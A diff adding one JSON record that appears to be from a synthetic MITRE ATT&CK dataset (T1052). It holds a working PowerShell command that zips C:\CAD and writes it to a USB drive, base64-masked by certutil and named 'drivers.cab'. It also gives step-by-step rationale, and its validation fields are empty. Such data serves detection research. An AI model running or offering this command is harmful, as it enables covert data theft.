@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1052",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$usb=(Get-Volume | Where-Object {$_.DriveType -eq 'Removable' -and $_.DriveLetter} | Select-Object -First 1 -ExpandProperty DriveLetter)+':\\'; $zip=Join-Path $env:TEMP 'cad.zip'; Compress-Archive -Path 'C:\\CAD' -DestinationPath $zip -Force; certutil -f -encode $zip (Join-Path $usb 'drivers.cab') > $null",
+  "explanation": "Creates a zip of a target directory and writes a base64-encoded version to the removable drive using certutil.",
+  "rationale_steps": [
+    "Find removable drive",
+    "Archive target data",
+    "Encode with certutil for content-masking",
+    "Write encoded output to USB"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1052-b282912d-5a8e4c43",
+  "source_prompt_hash": "b282912d",
+  "timestamp_utc": "2025-09-30T05:30:27.458223Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
